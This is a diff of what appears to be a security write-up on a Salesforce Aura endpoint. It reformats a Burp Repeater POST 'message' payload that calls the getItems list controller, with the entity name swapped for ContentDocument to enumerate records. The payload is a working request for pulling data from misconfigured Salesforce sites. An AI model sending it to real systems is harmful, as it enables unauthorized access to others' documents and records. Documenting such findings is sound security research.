@@ -32,9 +32,10 @@ I found an endpoint like:
 ![](https://images.squarespace-cdn.com/content/v1/5f7770a896185c777e49b396/1602179691337-ZXQYGZ11DJ60P6T3RURB/ke17ZwdGBToddI8pDm48kD6aNKZxB3DN5p6JsVrwzw1Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZcY1lis3u7ujHaqKviAjfgBXb2P7ACMlJX44aBDLb--xfEjN8oatzV-2psMy5gKWM4rq4TCJTzAyL25jm0DX3aYLdXwLHXSvXM5NA8ifPwj1/aura_query.PNG?format=2500w)
 
 then I sent this POST request to the Repeater and changed the ***Message*** parameter to:
+```
+{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"MARKER","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}
 
-`{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"MARKER","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}`
-
+```
 Replacing the ***MARKER*** string with:
 
 ***ContentDocument***
